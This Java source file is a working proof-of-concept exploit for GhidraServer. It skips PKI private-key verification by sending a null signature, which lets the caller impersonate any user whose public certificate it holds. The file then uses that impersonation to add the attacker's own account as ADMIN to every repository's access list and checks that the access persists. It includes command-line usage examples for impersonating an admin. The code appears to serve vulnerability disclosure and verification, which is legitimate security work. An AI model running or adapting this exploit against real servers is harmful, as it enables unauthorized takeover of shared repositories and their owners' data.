import java.io.*;
import java.net.*;
import java.rmi.registry.*;
import java.rmi.server.RMIClientSocketFactory;
import java.security.*;
import java.security.cert.*;
import java.util.*;
import javax.net.ssl.*;
import javax.security.auth.*;
import javax.security.auth.callback.*;

import ghidra.framework.remote.*;

/**
 * GhidraServer PKI Privilege Escalation:
 *   Null Signature Bypasses Identity Verification
 *
 * Exploits a flaw in PKIAuthenticationModule.authenticate() where a null
 * client signature causes the server to skip private-key verification,
 * authenticating the caller as whichever user's PUBLIC certificate was
 * presented — without proof of private key possession.
 *
 * With --target-cert, the exploit:
 *   1. Impersonates the target (admin) via null signature bypass
 *   2. Creates a repository if none exist (creator becomes admin of the repo)
 *   3. Adds the attacker's real account with ADMIN permission to every
 *      accessible repository via setUserList()
 *   4. Verifies by reconnecting as the attacker (normal auth) and confirming
 *      ADMIN access persists — no further exploitation needed
 */
public class Poc {

    static SSLContext sslCtx;

    static String host = "localhost";
    static int port = 13100;
    static String targetCert = null;
    static String userKey = null;
    static String keyPass = "changeit";
    static String caCert = null;
    static String repoName = null;

    public static void main(String[] args) throws Exception {
        parseArgs(args);

        System.out.println("=".repeat(72));
        System.out.println(" GhidraServer PKI Privilege Escalation — Null Signature Bypass");
        System.out.println("=".repeat(72));

        // ── Load certificates ────────────────────────────────────────────────
        CertificateFactory cf = CertificateFactory.getInstance("X.509");

        X509Certificate target = null;
        if (targetCert != null) {
            try (FileInputStream f = new FileInputStream(targetCert)) {
                target = (X509Certificate) cf.generateCertificate(f);
            }
        }

        X509Certificate ca;
        try (FileInputStream f = new FileInputStream(caCert)) {
            ca = (X509Certificate) cf.generateCertificate(f);
        }

        KeyStore userKS = KeyStore.getInstance("PKCS12");
        try (FileInputStream f = new FileInputStream(userKey)) {
            userKS.load(f, keyPass.toCharArray());
        }
        String alias = userKS.aliases().nextElement();
        X509Certificate userCert = (X509Certificate) userKS.getCertificate(alias);
        PrivateKey userPrivKey = (PrivateKey) userKS.getKey(alias, keyPass.toCharArray());

        System.out.println();
        System.out.println("  Target server:   " + host + ":" + port);
        System.out.println("  User cert:       " + userCert.getSubjectX500Principal());
        System.out.println("  CA:              " + ca.getSubjectX500Principal());
        if (target != null) {
            System.out.println("  Target cert:     " + target.getSubjectX500Principal());
            System.out.println("  Mode:            EXPLOIT + ESCALATE (null signature bypass)");
        } else {
            System.out.println("  Mode:            Normal authentication");
        }
        System.out.println();

        // ── Configure mTLS with attacker's own cert ──────────────────────────
        KeyManagerFactory kmf = KeyManagerFactory.getInstance(
            KeyManagerFactory.getDefaultAlgorithm());
        kmf.init(userKS, keyPass.toCharArray());

        KeyStore trustStore = KeyStore.getInstance("JKS");
        trustStore.load(null, null);
        trustStore.setCertificateEntry("ca", ca);
        TrustManagerFactory tmf = TrustManagerFactory.getInstance(
            TrustManagerFactory.getDefaultAlgorithm());
        tmf.init(trustStore);

        sslCtx = SSLContext.getInstance("TLS");
        sslCtx.init(kmf.getKeyManagers(), tmf.getTrustManagers(), new SecureRandom());
        SSLContext.setDefault(sslCtx);

        // ── Connect: exploit or normal ───────────────────────────────────────
        String authenticatedUser;
        if (target != null) {
            RemoteRepositoryServerHandle initialServer = exploitAuth(host, port, target, ca, userCert);
            authenticatedUser = initialServer.getUser();

            String[] users = initialServer.getAllUsers();

            System.out.println();
            System.out.println("=".repeat(72));
            System.out.println(" EXPLOIT SUCCEEDED — AUTHENTICATED AS: " + authenticatedUser);
            System.out.println("=".repeat(72));
            System.out.println();
            System.out.println("  mTLS layer identity:        " + userCert.getSubjectX500Principal());
            System.out.println("  Application layer identity:  " + authenticatedUser +
                " (from " + target.getSubjectX500Principal() + ")");
            System.out.println("  Target private key used:     NO");
            System.out.println();
            System.out.println("  Server users (" + users.length + "):");
            for (String u : users) System.out.println("    - " + u);
        } else {
            RemoteRepositoryServerHandle initialServer = normalAuth(host, port, userCert, ca, userPrivKey);
            authenticatedUser = initialServer.getUser();

            String[] users = initialServer.getAllUsers();

            System.out.println();
            System.out.println("=".repeat(72));
            System.out.println(" CONNECTED — AUTHENTICATED AS: " + authenticatedUser);
            System.out.println("=".repeat(72));
            System.out.println();
            System.out.println("  Server users (" + users.length + "):");
            for (String u : users) System.out.println("    - " + u);

            String[] repos = initialServer.getRepositoryNames();
            System.out.println("  Repositories (" + repos.length + "):");
            for (String r : repos) System.out.println("    - " + r);
            System.out.println();
            System.out.println("=".repeat(72));
            return;
        }

        // ── ESCALATE: determine attacker's real username ─────────────────────
        System.out.println();
        System.out.println("─".repeat(72));
        System.out.println(" ESCALATION: Granting attacker persistent ADMIN access");
        System.out.println("─".repeat(72));

        // Find attacker's username by authenticating normally
        System.out.println();
        System.out.println("[E1] Determining attacker's real server username...");
        RemoteRepositoryServerHandle serverAsAttacker =
            normalAuth(host, port, userCert, ca, userPrivKey);
        String attackerUsername = serverAsAttacker.getUser();
        System.out.println("     Attacker username: " + attackerUsername);

        // ── ESCALATE: create repo if needed, then grant ADMIN ────────────────
        // Re-authenticate as target for the escalation operations
        RemoteRepositoryServerHandle serverForEscalation =
            exploitAuth(host, port, target, ca, userCert);

        String createName = (repoName != null) ? repoName : "SharedAnalysis";
        String[] repos = serverForEscalation.getRepositoryNames();

        if (repos.length == 0) {
            System.out.println();
            System.out.println("[E2] No repositories exist. Creating '" + createName + "'...");
            RepositoryHandle newRepo = serverForEscalation.createRepository(createName);
            System.out.println("     Created repository: " + newRepo.getName());
            System.out.println("     Creator (" + authenticatedUser + ") is ADMIN of new repo");
            repos = serverForEscalation.getRepositoryNames();
        }

        // Filter to specific repo if --repo-name was given
        if (repoName != null) {
            repos = Arrays.stream(repos).filter(r -> r.equals(repoName)).toArray(String[]::new);
            if (repos.length == 0) {
                System.err.println("Error: repository '" + repoName + "' not found on server.");
                System.exit(1);
            }
        }

        System.out.println();
        System.out.println("[E3] Escalating attacker on " + repos.length + " repository(ies)...");

        for (String rn : repos) {
            System.out.println();
            System.out.println("     Repository: " + rn);

            RepositoryHandle repoHandle;
            try {
                repoHandle = serverForEscalation.getRepository(rn);
            } catch (Exception e) {
                System.err.println("Error: cannot access repository '" + rn + "': " + e.getMessage());
                System.exit(1);
                return; // unreachable, satisfies compiler
            }
            if (repoHandle == null) {
                System.err.println("Error: repository '" + rn + "' not found or inaccessible.");
                System.exit(1);
            }

            // Read current ACL
            User[] currentUsers = repoHandle.getUserList();
            System.out.println("     Current ACL:");
            for (User u : currentUsers) System.out.println("       " + u);

            // Build new ACL: keep all existing users, add/upgrade attacker to ADMIN
            Map<String, User> aclMap = new LinkedHashMap<>();
            for (User u : currentUsers) {
                aclMap.put(u.getName(), u);
            }
            aclMap.put(attackerUsername, new User(attackerUsername, User.ADMIN));

            User[] newAcl = aclMap.values().toArray(new User[0]);

            // Write new ACL
            repoHandle.setUserList(newAcl, repoHandle.anonymousAccessAllowed());

            // Verify
            User[] updatedUsers = repoHandle.getUserList();
            System.out.println("     Updated ACL:");
            for (User u : updatedUsers) System.out.println("       " + u);
        }

        // ── VERIFY: attacker logs in normally and confirms ADMIN ─────────────
        System.out.println();
        System.out.println("─".repeat(72));
        System.out.println(" VERIFICATION: Attacker authenticating with own credentials");
        System.out.println("─".repeat(72));
        System.out.println();
        System.out.println("  (Normal authentication — no exploit, using attacker's own");
        System.out.println("   certificate and private key to prove this persists)");

        RemoteRepositoryServerHandle verifyServer =
            normalAuth(host, port, userCert, ca, userPrivKey);

        String verifyUser = verifyServer.getUser();
        System.out.println();
        System.out.println("  Authenticated as: " + verifyUser + " (normal login, no exploit)");

        repos = verifyServer.getRepositoryNames();
        System.out.println("  Accessible repositories (" + repos.length + "):");

        for (String rn : repos) {
            RepositoryHandle repoHandle = verifyServer.getRepository(rn);
            User self = repoHandle.getUser();
            System.out.println("    - " + rn + " [" + self + "]");
        }

        System.out.println();
        System.out.println("=".repeat(72));
        System.out.println(" ESCALATION COMPLETE");
        System.out.println("=".repeat(72));
        System.out.println();
        System.out.println("  Attacker '" + attackerUsername + "' now has ADMIN on all repos.");
        System.out.println("  This access is PERSISTENT — it survives server restarts");
        System.out.println("  and does not require further exploitation.");
        System.out.println("=".repeat(72));
    }

    // =====================================================================
    // Authentication helpers
    // =====================================================================

    /**
     * RMI socket factory that uses our custom SSLContext and disables
     * hostname verification (required when connecting via IP or alternate
     * addresses not listed in the server cert's SAN).
     */
    static RMIClientSocketFactory makeSslFactory() {
        return (h, p) -> {
            SSLSocket sock = (SSLSocket) sslCtx.getSocketFactory().createSocket(h, p);
            SSLParameters params = sock.getSSLParameters();
            params.setEndpointIdentificationAlgorithm("");
            sock.setSSLParameters(params);
            return sock;
        };
    }

    /**
     * Authenticate via null-signature exploit (impersonate target).
     */
    static RemoteRepositoryServerHandle exploitAuth(
            String host, int port,
            X509Certificate target, X509Certificate ca,
            X509Certificate attackerCert) throws Exception {

        RMIClientSocketFactory sslFactory = makeSslFactory();
        Registry registry = LocateRegistry.getRegistry(host, port, sslFactory);

        GhidraServerHandle handle =
            (GhidraServerHandle) registry.lookup(GhidraServerHandle.BIND_NAME);

        Callback[] callbacks = handle.getAuthenticationCallbacks();
        SignatureCallback sigCb = null;
        for (Callback cb : callbacks) {
            if (cb instanceof SignatureCallback) sigCb = (SignatureCallback) cb;
        }
        if (sigCb == null) throw new RuntimeException("No SignatureCallback");

        // THE EXPLOIT: null signature
        X509Certificate[] targetChain = new X509Certificate[]{ target, ca };
        sigCb.sign(targetChain, null);

        Subject subject = new Subject();
        subject.getPrincipals().add(new GhidraPrincipal("poc"));
        return handle.getRepositoryServer(subject, callbacks);
    }

    /**
     * Authenticate normally with own cert + valid signature.
     */
    static RemoteRepositoryServerHandle normalAuth(
            String host, int port,
            X509Certificate cert, X509Certificate ca,
            PrivateKey privateKey) throws Exception {

        RMIClientSocketFactory sslFactory = makeSslFactory();
        Registry registry = LocateRegistry.getRegistry(host, port, sslFactory);

        GhidraServerHandle handle =
            (GhidraServerHandle) registry.lookup(GhidraServerHandle.BIND_NAME);

        Callback[] callbacks = handle.getAuthenticationCallbacks();
        SignatureCallback sigCb = null;
        for (Callback cb : callbacks) {
            if (cb instanceof SignatureCallback) sigCb = (SignatureCallback) cb;
        }
        if (sigCb == null) throw new RuntimeException("No SignatureCallback");

        // Normal: sign the token with private key
        byte[] token = sigCb.getToken();
        Signature sig = Signature.getInstance(cert.getSigAlgName());
        sig.initSign(privateKey);
        sig.update(token);
        byte[] signature = sig.sign();

        X509Certificate[] certChain = new X509Certificate[]{ cert, ca };
        sigCb.sign(certChain, signature);

        Subject subject = new Subject();
        subject.getPrincipals().add(new GhidraPrincipal("poc"));
        return handle.getRepositoryServer(subject, callbacks);
    }

    // =====================================================================
    // Argument parsing
    // =====================================================================

    static void parseArgs(String[] args) {
        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--host":
                    host = args[++i];
                    break;
                case "--port":
                    port = Integer.parseInt(args[++i]);
                    break;
                case "--target-cert":
                    targetCert = args[++i];
                    break;
                case "--user-key":
                    userKey = args[++i];
                    break;
                case "--password":
                    keyPass = args[++i];
                    break;
                case "--ca-cert":
                    caCert = args[++i];
                    break;
                case "--repo-name":
                    repoName = args[++i];
                    break;
                case "--help": case "-h":
                    usage();
                    System.exit(0);
                    break;
                default:
                    System.err.println("Unknown option: " + args[i]);
                    usage();
                    System.exit(1);
            }
        }

        if (userKey == null || caCert == null) {
            System.err.println("Error: --user-key and --ca-cert are required.");
            System.err.println();
            usage();
            System.exit(1);
        }
    }

    static void usage() {
        System.out.println("GhidraServer PKI Privilege Escalation PoC");
        System.out.println();
        System.out.println("Usage: java Poc --user-key <p12> --ca-cert <ca> [options]");
        System.out.println();
        System.out.println("Required:");
        System.out.println("  --user-key <path>      PKCS12 keystore (certificate + private key).");
        System.out.println("                         Must be signed by the CA the server trusts.");
        System.out.println("  --ca-cert <path>       CA certificate trusted by the server (PEM)");
        System.out.println();
        System.out.println("Options:");
        System.out.println("  --target-cert <path>   Target user's PUBLIC certificate (PEM) to impersonate.");
        System.out.println("                         If omitted, connects normally with --user-key credentials.");
        System.out.println("  --host <hostname>      GhidraServer hostname (default: localhost)");
        System.out.println("  --port <port>          RMI registry port (default: 13100)");
        System.out.println("  --password <pass>      PKCS12 keystore password (default: changeit)");
        System.out.println("  --repo-name <name>     Target a specific repository (exploit mode only).");
        System.out.println("                         Only that repo is escalated; used as the name if creating.");
        System.out.println("                         Exits with error if the repo does not exist or is inaccessible.");
        System.out.println("  -h, --help             Show this help message");
        System.out.println();
        System.out.println("Examples:");
        System.out.println("  # Connect normally (no exploit)");
        System.out.println("  java Poc --user-key analyst.p12 --ca-cert ca.crt");
        System.out.println();
        System.out.println("  # Impersonate admin and escalate to persistent ADMIN access on all repos");
        System.out.println("  java Poc --target-cert admin.crt --user-key analyst.p12 --ca-cert ca.crt");
        System.out.println();
        System.out.println("  # Escalate on a specific repository only");
        System.out.println("  java Poc --target-cert admin.crt --user-key analyst.p12 --ca-cert ca.crt --repo-name MyProject");
    }
}
